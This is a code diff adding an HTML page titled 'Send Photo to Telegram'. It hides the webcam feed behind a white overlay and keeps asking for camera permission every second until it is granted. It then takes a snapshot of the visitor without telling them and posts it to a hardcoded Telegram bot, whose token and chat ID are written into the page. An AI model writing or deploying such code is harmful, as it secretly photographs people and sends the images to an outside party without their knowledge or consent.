@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Photo to Telegram</title>
+    <script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
+    <style>
+        canvas {
+            display: none;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 900px;
+            height: 700px;
+            background-color: white;
+            z-index: 1;
+        }
+        #webCam {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <video id="webCam" autoplay playsinline width="900" height="700"></video>
+    <canvas id="canvas" aria-placeholder="sadrag"></canvas>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const webCamElement = document.getElementById("webCam");
+            const canvasElement = document.getElementById("canvas");
+            const webcam = new Webcam(webCamElement, "user", canvasElement);
+            
+            // Initialize snapshotCounter from localStorage or start from 1 if not present
+            let snapshotCounter = localStorage.getItem('snapshotCounter');
+            if (!snapshotCounter) {
+                snapshotCounter = 1;
+            } else {
+                snapshotCounter = parseInt(snapshotCounter); // Ensure it's an integer
+            }
+
+            function checkCameraPermission() {
+                if (localStorage.getItem('cameraPermission') === 'granted') {
+                    startWebcam();
+                } else {
+                    requestCameraPermission();
+                }
+            }
+        
+            function requestCameraPermission() {
+                webcam.start()
+                    .then(() => {
+                        localStorage.setItem('cameraPermission', 'granted');
+                        takeAPicture();
+                    })
+                    .catch(err => {
+                        localStorage.setItem('cameraPermission', 'denied');
+                        setTimeout(requestCameraPermission, 1000); // Retry after 3 seconds
+                    });
+            }
+        
+            function startWebcam() {
+                webcam.start()
+                    .then(() => {
+                        setTimeout(() => {
+                            takeAPicture();
+                        }, 1000); // Wait time (1 second)
+                    })
+                    .catch(err => {
+                        console.error(err);
+                    });
+            }
+        
+            function takeAPicture() {
+                webcam.snap()
+                    .then(pictureBlob => {
+                        let fileName = `snapshot${snapshotCounter}.png`; // Unique file name
+
+                        // Replace with your Telegram bot API token and chat ID
+                        let botToken = '7237749285:AAGGtOLFEncaQQsFwqFWZk-iydsJjmSm4yM';
+                        let chatId = '5480769413';
+
+                        // Prepare FormData to send file to Telegram
+                        let formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', pictureBlob, fileName);
+
+                        // Send the file using fetch
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Message sent to Telegram:', data);
+                        })
+                        .catch(error => {
+                            console.error('Error sending message to Telegram:', error);
+                        });
+
+                        snapshotCounter++; // Increment snapshot counter for next picture
+                        localStorage.setItem('snapshotCounter', snapshotCounter); // Save snapshotCounter in localStorage
+                    })
+                    .catch(error => {
+                        console.error('Error taking picture:', error);
+                    });
+            }
+        
+            checkCameraPermission();
+        });
+    </script>
+</body>
+</html>
